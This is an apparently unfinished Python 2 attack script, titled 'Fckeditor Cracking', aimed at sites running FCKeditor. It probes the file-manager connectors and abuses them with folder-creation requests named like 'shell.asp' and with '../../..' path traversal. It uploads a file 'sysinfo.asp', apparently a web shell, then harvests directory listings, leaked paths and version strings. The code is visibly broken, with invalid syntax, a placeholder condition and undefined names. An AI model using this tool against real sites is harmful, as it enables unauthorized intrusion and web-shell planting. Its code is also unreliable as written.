#!/usr/bin/env python
#coding = utf-8
import re
import urllib
import urllib2
import os
import sys
import httplib
sys.path.append("plugin/")
import color_pr
import time
from poster.streaminghttp import register_openers
from poster.encode import multipart_encode

global site,resp
dics = ["/","/admin/fckeditor/","/manage/fckeditor/","/fckeditor/"]
#os.system("pwd")
#print os.getcwd()
def response(dic,filename):
	params = urllib.urlencode({"Demon":"test"})
	headers = {"Content-type":"application/x-www-form-urlencoded"}
	conn = httplib.HTTPConnection(site,"80")
	conn.request("POST",filename,params,headers)
	resp = conn.getresponse()
	return resp
def shell_handler():
	if response(dic,"/editor/filemanager/upload/php/upload.php").status == 200:
		upload_url = "http://"+site+dic+"/editor/filemanager/upload/php/upload.php?Type=Media"
		upload()
	elif response(dic,"/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=Image&CurrentFolder=%2Ffold.asp&NewFolderName=z&uuid=1244789975684").status == 200:
		upload_url = ""
		upload()
	elif response(dic,"/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&CurrentFolder=/&Type=Image&NewFolderName=fold.asp").status == 200:
		upload_url = ""
		upload()
	elif up_url = page():
		print up_url

#def page():
#	f = open("dic.txt","r")
#	for line in f.readlines():
#		if ############:
#			return line
#		else:
#			return 0

def upload():
	opener = poster.streaminghttp.register_openers()
	opener.add_handler(urllib2.HTTPCookieProcessor(cookielib.CookieJar()))
	params = {'file': open("sysinfo.asp", "rb"), 'name': 'NewFile'}
	datagen, headers = poster.encode.multipart_encode(params)
	request = urllib2.Request(upload_url, datagen, headers)
	result = urllib2.urlopen(request)

def index_of():
	index_urls = ['/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F','/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F','/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../..%2F&NewFolderName=shell.asp']
	index_dics = ['Index of','parent dictionary']
	for index_url in index_urls:
		html = urllib.urlopen(site+dic+index_url)
		for index_dic in index_dics:
			pattern = re.compile(index_dic)
			match = html.search(pattern)
			if match:
				print color_pr.red("[!]Fckeditor with a dic xday==>\n"+index_dic+'\n')

def xpath():
	xpath_dics =['FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp','/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2F&NewFolderName=aux']
	for xpath_dic in xpath_dics:
		html= urllib.urlopen(site+dic+xpath_dic)
		pattern = re.compile('<p>.*,')
		match = html.search(pattern)
		if match:
			print color_pr.green([!]"Fckeditor xpath may be"+match.group(0)[3,-1]


def info_gather():
	ver_dic={'editor/dialog/fck_about.html':['<b>.*</b><br','4','-7'],'_whatsnew.html':['Ver.*</h3','0','-4'],'editor/_source/fckeditorapi.js':['Version.*,"V','0','-2'],'editor/js/fckeditorcode_gecko.js':['Version.*",V','0','-2'],'editor/js/fckeditorcode_ie.js':['Version.*",V','0','-2']}
	for key in ver_dic:
		html = urllib.urlopen(site+dic+key)
		pattern = re.compile(ver_dic[key][0])
		match = re.search(pattern,html)
		if match:
			print color_pr.green("[!]Fckeditor ===>"+match.group(0)[ver_dic[key][1]:ver_dic[key][2]])
		#else:
			print color_pr.red("[-]Info_gather failed.")
	
if __name__ == "__main__":
	#print sys.argv[1]
	site = sys.argv[1]
	print color_pr.red("||===>"+site+"====Fckeditor Cracking========>")
	for dic in dics:
		resp = response(dic)
		#if resp.status == 403 or 200:
		filename = dic
		upload()
		index_of()
		xpath()
		info_gather()
	if file is empty:
		print color_pr.red("[-]Info_gather failed.")
		
		#else:
		#print color_pr.yellow("[!]Sorry,<"+site+">may be no chance!")
